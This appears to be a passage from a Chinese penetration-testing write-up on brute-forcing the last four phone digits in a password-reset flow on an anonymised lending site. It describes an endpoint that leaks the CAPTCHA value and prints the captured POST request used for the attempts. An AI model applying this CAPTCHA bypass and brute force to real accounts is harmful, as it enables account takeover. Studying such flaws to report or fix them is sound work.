想到的是爆破  
有验证码？  
发现这个连接  
https://m.xxx.com/p2p\_mobile\_portal/index.php/site/getVCode  
访问就会返回验证码  
  
那么我们来爆破下后四位  就需要同时自动输入页面返回的验证码  
  
抓包  
我们可以自己写一个脚本  也可以使用现成的工具  
数据包长这样  
  
POST /p2p\_mobile\_portal/index.php/loginPassword/verifyID HTTP/1.1  
Host: m.xxx.com  
Accept: \*/\*  
X-Requested-With: XMLHttpRequest  
Accept-Encoding: gzip, deflate  
Accept-Language: zh-cn  
Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
Origin: https://m.xxx.com  
Content-Length: 46  
Connection: close  
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 9\_3\_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35  
Referer: https://m.xxx.com/forgetpassworduser.html  
Cookie: PHPSESSID=ajdoejgibisjmp74j4bk4s4421  
  
username=admin8299&mobile=1234&verifyCode=sket
